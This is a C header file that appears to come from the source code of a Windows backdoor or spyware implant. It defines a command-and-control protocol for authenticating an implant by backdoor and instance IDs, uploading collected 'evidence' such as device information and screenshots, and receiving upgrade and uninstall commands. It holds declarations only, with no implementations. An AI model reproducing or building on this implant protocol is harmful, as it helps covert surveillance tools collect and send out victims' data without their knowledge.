#ifndef _PROTO_H
#define _PROTO_H

#include <windows.h>
#include "sha1.h"

#define UPGRADE_NOP 1
#define UPGRADE_DIE 2
#define UPGRADE_DELETE_AND_DIE 3


#define INVALID_COMMAND         (UINT)0x0       // Non usare
#define PROTO_OK                (UINT)0x1       // OK
#define PROTO_NO                (UINT)0x2       // Richiesta senza risposta
#define PROTO_BYE               (UINT)0x3       // Chiusura di connessione
#define PROTO_EVIDENCE          (UINT)0x9       // Spedisce un evidence
#define PROTO_UNINSTALL         (UINT)0xa       // Disinstallazione
#define PROTO_EVIDENCE_SIZE     (UINT)0x0b		// 
#define PROTO_ID                (UINT)0xf       // Identificazione    
#define PROTO_UPGRADE           (UINT)0x16      // Riceve un upgrade


// evidences tag
//#define PM_DEVICEINFO         0x0240
#define PM_INFOSTRING	0x0241
#define PM_DEVICEINFO	0xfff1
#define PM_SCREENSHOT	0xfff2	


typedef struct _PROTO_COMMAND_AUTH
{
	ULONG uProtoVersion;
	BYTE pRandomData[16];
	BYTE pSha1Digest[20];
	BYTE pBackdoorId[16];
	BYTE pInstanceId[20];
	struct
	{
		BYTE uArch;		// windows(0)
		BYTE uStage;	// scout(0), elite(1)
		BYTE uType;		// demo(0), release(1)
		BYTE uFlag;		// reserverd(0);
	} pSubType;
} PROTO_COMMAND_AUTH, *PPROTO_COMMAND_AUTH;

typedef struct _PROTO_RESPONSE_AUTH
{
	BYTE pRandomData[16];
	BYTE pSha1Digest[20];
	ULONG uProtoCommand;
	ULONG64 uTime;
} PROTO_RESPONSE_AUTH, *PPROTO_RESPONSE_AUTH;


typedef struct _PROTO_RESPONSE_ID
{
	ULONG uProtoCommand;
	ULONG uMessageLen;
	ULONG64 uTime;
	ULONG uAvailables;
} PROTO_RESPONSE_ID, *PPROTO_RESPONSE_ID;

typedef struct _PROTO_RESPONSE_UPGRADE
{
	ULONG uProtoCommand;
	ULONG uResponseLen;
	ULONG uUpgradeLeft;
	ULONG uUpgradeNameLen;
	WCHAR pUpgradeNameBuffer;
} PROTO_RESPONSE_UPGRADE, *PPROTO_RESPONSE_UPGRADE;


typedef struct _PROTO_COMMAND_EVIDENCES_SIZE
{
	ULONG uEvidenceNum;
	LARGE_INTEGER uEvidenceSize;
} PROTO_COMMAND_EVIDENCES_SIZE, *PPROTO_COMMAND_EVIDENCES_SIZE;


BOOL SyncWithServer();
ULONG Align(ULONG uSize, ULONG uAlignment);
ULONG GetRandomInt(ULONG uMin, ULONG uMax);
PWCHAR GetRandomString(ULONG uMin);
VOID GenerateRandomData(PBYTE pBuffer, ULONG uBuffLen);
BOOL GetUserUniqueHash(PBYTE pUserHash, ULONG uHashSize);
PBYTE PascalizeString(PWCHAR pString, PULONG uOutLen);
BOOL SendInfo(LPWSTR pInfoString);

VOID CalculateSHA1(PBYTE pSha1Buffer, PBYTE pBuffer, ULONG uBufflen);
//ULONG CommandHash(ULONG uProtoCmd, PBYTE pMessage, ULONG uMessageLen, PBYTE pEncryptionKey);
ULONG CommandHash(ULONG uProtoCmd, PBYTE pMessage, ULONG uMessageLen, PBYTE pEncryptionKey, PBYTE *pOutBuff);

#endif